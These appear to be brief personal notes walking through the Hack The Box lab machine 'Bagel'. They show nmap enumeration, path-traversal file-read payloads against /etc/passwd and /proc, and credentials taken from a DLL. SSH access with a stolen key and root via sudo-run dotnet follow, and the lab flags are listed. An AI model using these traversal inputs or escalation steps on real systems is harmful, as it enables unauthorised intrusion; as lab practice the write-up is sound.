# enum
```
sudo echo 10.129.233.243 bagel.htb >> /etc/hosts

nmap -sC -sV -Pn -oA bagel bagel.htb -vvvv

able to access http://bagel.htb:5000/ - nothing

the site is on port 8000 -> http://bagel.htb:8000

/orders -> meaningless orders?
/page=index.html (possible lfi?)

testing http://bagel.htb:8000/?page=../../../../etc/passwd -> works!

users that have a shell:

developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash

http://bagel.htb:8000/?page=../../../../../../../proc/self/cmdline
leads to this command -> python3 /home/developer/app/app.py

http://bagel.htb:8000/?page=../../../../../../..//home/developer/app/app.py


python3 STEWS-vuln-detect.py -n -u bagel.htb:5000 -1

>>>VANILLA CSWSH DETECTED: ws://bagel.htb:5000 likely vulnerable to vanilla CSWSH (any origin)
====Full list of vulnerable URLs===
['ws://bagel.htb:5000']
['>>>VANILLA CSWSH DETECTED: ws://bagel.htb:5000 likely vulnerable to vanilla CSWSH (any origin)']

so apparently you can enumerate processes at /proc/{pid}/cmdline

found this path - dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll

from dll..

user id: dev
password: k8wdAYYKyhnjg3K

might be useful for later...

get phil's private key with deserialize.py

ssh -i phil.key phil@bagel.htb

user.txt -> 893ae92c7174133e6a92502031b30564

from here on out it's simple .. su - developer with the "db" password and create a C# program that reads /root/root.txt as you can run dotnet as root

root.txt -> 8031ea66419372d13483ac846913f4b0
```

m0nk3yGainz>??
